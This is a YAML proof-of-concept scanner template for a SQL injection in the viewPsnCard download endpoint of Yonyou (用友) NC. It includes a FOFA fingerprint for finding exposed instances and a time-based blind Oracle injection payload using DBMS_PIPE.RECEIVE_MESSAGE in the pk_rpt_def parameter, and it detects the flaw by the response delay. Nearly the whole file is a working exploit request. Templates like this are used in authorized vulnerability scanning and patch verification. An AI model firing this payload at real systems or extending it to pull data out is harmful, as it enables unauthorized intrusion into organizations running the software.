id: poc-yaml-yongyou-nc-viewpsncard-sqli
info:
  name: 用友NC viewPsnCard SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"Yonyou NC")
- method: GET
  path: /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{.t1}})--&pk_psnjob=1
  expression: status_code == 200 && body == "" && duration > t1 && duration < t2
transport: http
